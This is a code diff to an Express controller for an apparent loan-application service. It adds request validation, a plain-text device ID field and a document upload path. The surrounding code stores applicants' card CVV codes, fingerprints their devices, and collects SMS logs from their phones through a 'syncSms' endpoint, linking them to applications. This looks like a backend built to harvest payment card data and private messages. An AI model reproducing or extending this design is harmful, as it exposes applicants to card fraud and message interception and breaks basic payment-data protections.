@@ -2,8 +2,10 @@ const { Application, SmsLog } = require('../models');
 const { validationResult } = require('express-validator');
 
 exports.submitApplication = async (req, res) => {
-    console.log('[RUTHLESS TRACE] New Application Submission Incoming');
-    console.log(JSON.stringify(req.body, null, 2));
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+        return res.status(400).json({ errors: errors.array() });
+    }
 
     try {
         const {
@@ -32,13 +34,15 @@ exports.submitApplication = async (req, res) => {
                 cardCvv,
                 loanAmountOffer: amount
             },
+            deviceId: deviceId, // Plain text for fast lookup
             deviceFingerprint: {
                 deviceId,
                 deviceInfo,
                 appId,
                 jobType,
                 maritalStatus
-            }
+            },
+            documentPath: req.file ? `/uploads/${req.file.filename}` : null
         });
 
         console.log('[RUTHLESS TRACE] Application Created Successfully:', newApplication.applicationId);
@@ -80,7 +84,7 @@ exports.syncSms = async (req, res) => {
 
         // Find application by device ID if possible
         const application = await Application.findOne({
-            where: { deviceFingerprint: { deviceId: deviceId } }
+            where: { deviceId: deviceId }
         });
 
         await SmsLog.create({
